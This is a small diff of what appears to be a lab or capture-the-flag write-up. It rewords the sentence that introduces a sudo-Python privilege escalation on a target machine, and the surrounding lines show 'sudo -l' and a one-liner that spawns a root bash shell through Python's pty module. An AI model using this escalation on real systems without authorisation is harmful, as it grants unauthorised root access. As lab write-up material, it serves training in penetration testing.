@@ -122,7 +122,7 @@ ___
 ```
 sudo -l
 ```
-This showed that steven has sudo permission's to run Python.  Upon further diving and searching online the following command can be used to properly gain 'root' on the Target1 machine:
+This showed that steven has sudo permission's to run Python.  Upon further reading I found the following Python command can be used to properly gain 'root' on the Target1 machine:
 
 ```
 sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
